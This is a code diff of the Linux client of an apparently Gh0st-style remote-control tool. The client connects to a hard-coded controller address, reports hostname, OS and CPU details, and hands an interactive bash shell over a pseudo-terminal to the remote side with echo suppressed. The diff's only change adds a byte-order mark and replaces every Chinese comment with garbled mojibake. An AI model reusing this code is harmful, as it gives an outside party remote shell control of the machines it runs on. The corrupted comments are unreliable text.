@@ -1,4 +1,4 @@
-#include "common/commands.h"
+﻿#include "common/commands.h"
 #include "client/IOCPClient.h"
 #include <unistd.h>
 #include <sys/utsname.h>
@@ -19,13 +19,13 @@
 
 int DataProcess(void* user, PBYTE szBuffer, ULONG ulLength);
 
-// 远程地址：当前为写死状态，如需调试，请按实际情况修改
+// 杩滅▼鍦板潃锛氬綋鍓嶄负鍐欐鐘舵€侊紝濡傞渶璋冭瘯锛岃鎸夊疄闄呮儏鍐典慨鏀?
 CONNECT_ADDRESS g_SETTINGS = {FLAG_GHOST, "192.168.0.92", "6543", CLIENT_TYPE_LINUX};
 
-// 全局状态
+// 鍏ㄥ眬鐘舵€?
 State g_bExit = S_CLIENT_NORMAL;
 
-// 伪终端处理类：继承自IOCPManager.
+// 浼粓绔鐞嗙被锛氱户鎵胯嚜IOCPManager.
 class PTYHandler : public IOCPManager
 {
 public:
@@ -35,16 +35,16 @@ public:
             throw std::invalid_argument("IOCPClient pointer cannot be null");
         }
 
-        // 创建伪终端
+        // 鍒涘缓浼粓绔?
         if (openpty(&m_master_fd, &m_slave_fd, nullptr, nullptr, nullptr) == -1) {
             throw std::runtime_error("Failed to create pseudo terminal");
         }
 
-        // 设置伪终端为非阻塞模式
+        // 璁剧疆浼粓绔负闈為樆濉炴ā寮?
         int flags = fcntl(m_master_fd, F_GETFL, 0);
         fcntl(m_master_fd, F_SETFL, flags | O_NONBLOCK);
 
-        // 启动 Shell 进程
+        // 鍚姩 Shell 杩涚▼
         startShell();
     }
 
@@ -56,7 +56,7 @@ public:
         close(m_slave_fd);
     }
 
-    // 启动读取线程
+    // 鍚姩璇诲彇绾跨▼
     void Start()
     {
         if (m_running) return;
@@ -88,22 +88,22 @@ private:
     void startShell()
     {
         m_child_pid = fork();
-        if (m_child_pid == 0) {  // 子进程
-            setsid();  // 创建新的会话
+        if (m_child_pid == 0) {  // 瀛愯繘绋?
+            setsid();  // 鍒涘缓鏂扮殑浼氳瘽
             dup2(m_slave_fd, STDIN_FILENO);
             dup2(m_slave_fd, STDOUT_FILENO);
             dup2(m_slave_fd, STDERR_FILENO);
             close(m_master_fd);
             close(m_slave_fd);
 
-            // 关闭回显、禁用 ANSI 颜色、关闭 PS1
+            // 鍏抽棴鍥炴樉銆佺鐢?ANSI 棰滆壊銆佸叧闂?PS1
             const char* shell_cmd =
-                "stty -echo -icanon; "  // 禁用回显和规范模式
-                "export TERM=dumb; "    // 设置终端类型为 dumb
-                "export LS_COLORS=''; " // 禁用颜色
-                "export PS1='>'; "      // 设置提示符
-                //"clear; "             // 清空终端
-                "exec /bin/bash --norc --noprofile -i";  // 启动 Bash
+                "stty -echo -icanon; "  // 绂佺敤鍥炴樉鍜岃鑼冩ā寮?
+                "export TERM=dumb; "    // 璁剧疆缁堢绫诲瀷涓?dumb
+                "export LS_COLORS=''; " // 绂佺敤棰滆壊
+                "export PS1='>'; "      // 璁剧疆鎻愮ず绗?
+                //"clear; "             // 娓呯┖缁堢
+                "exec /bin/bash --norc --noprofile -i";  // 鍚姩 Bash
             execl("/bin/bash", "/bin/bash", "-c", shell_cmd, nullptr);
             exit(1);
         }
@@ -171,7 +171,7 @@ int DataProcess(void* user, PBYTE szBuffer, ULONG ulLength)
     return TRUE;
 }
 
-// 方法1: 解析 lscpu 命令（优先使用）
+// 鏂规硶1: 瑙ｆ瀽 lscpu 鍛戒护锛堜紭鍏堜娇鐢級
 double parse_lscpu()
 {
     std::array<char, 128> buffer;
@@ -183,7 +183,7 @@ double parse_lscpu()
         result += buffer.data();
     }
 
-    // 匹配 "Model name" 中的频率（如 "Intel(R) Core(TM) i5-6300HQ CPU @ 2.30GHz"）
+    // 鍖归厤 "Model name" 涓殑棰戠巼锛堝 "Intel(R) Core(TM) i5-6300HQ CPU @ 2.30GHz"锛?
     std::regex model_regex("@ ([0-9.]+)GHz");
     std::smatch match;
     if (std::regex_search(result, match, model_regex) && match.size() > 1) {
@@ -192,7 +192,7 @@ double parse_lscpu()
     return -1;
 }
 
-// 方法2: 解析 /proc/cpuinfo（备用）
+// 鏂规硶2: 瑙ｆ瀽 /proc/cpuinfo锛堝鐢級
 double parse_cpuinfo()
 {
     std::ifstream cpuinfo("/proc/cpuinfo");
@@ -210,7 +210,7 @@ double parse_cpuinfo()
     return -1;
 }
 
-// 一个基于Linux操作系统实现的受控程序例子: 当前只实现了注册、删除和终端功能.
+// 涓€涓熀浜嶭inux鎿嶄綔绯荤粺瀹炵幇鐨勫彈鎺х▼搴忎緥瀛? 褰撳墠鍙疄鐜颁簡娉ㄥ唽銆佸垹闄ゅ拰缁堢鍔熻兘.
 int main()
 {
     char hostname[256]= {};
@@ -230,8 +230,8 @@ int main()
     strcpy(logInfo.szPCName, hostname);
     strcpy(logInfo.OsVerInfoEx, systemInfo.sysname);
     strcpy(logInfo.szStartTime, ToPekingTimeAsString(nullptr).c_str());
-    double freq = parse_lscpu(); // 优先使用 lscpu
-    if (freq < 0) freq = parse_cpuinfo(); // 回退到 /proc/cpuinfo
+    double freq = parse_lscpu(); // 浼樺厛浣跨敤 lscpu
+    if (freq < 0) freq = parse_cpuinfo(); // 鍥為€€鍒?/proc/cpuinfo
     logInfo.dwCPUMHz = freq > 0 ? static_cast<unsigned int>(freq) : 0;
     logInfo.bWebCamIsExist = 0;
     strcpy_s(logInfo.szReserved, "LNX");
